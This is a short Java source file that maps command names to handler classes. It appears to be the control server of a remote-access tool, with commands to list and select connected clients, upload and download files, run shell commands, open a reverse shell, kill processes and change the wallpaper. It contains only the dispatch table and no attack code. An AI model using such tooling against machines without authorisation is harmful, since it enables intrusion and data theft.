package com.trattwalds.rixserver.commands;

public class Commands {
	public static void load() {
		Command.add("list", ListClients.class);
		Command.add("ls", ListClients.class);

		Command.add("select", SelectClient.class);
		Command.add("use", SelectClient.class);

		Command.add("exit", Exit.class);
		Command.add("quit", Exit.class);

		Command.add("echo", Echo.class);
		Command.add("kill", Kill.class);
		Command.add("ul", UploadFile.class);
		Command.add("dl", DownloadFile.class);
		Command.add("wallpaper", Wallpaper.class);
		Command.add("exec", ShellExec.class);
		Command.add("shell", ReverseShell.class);
	}
}
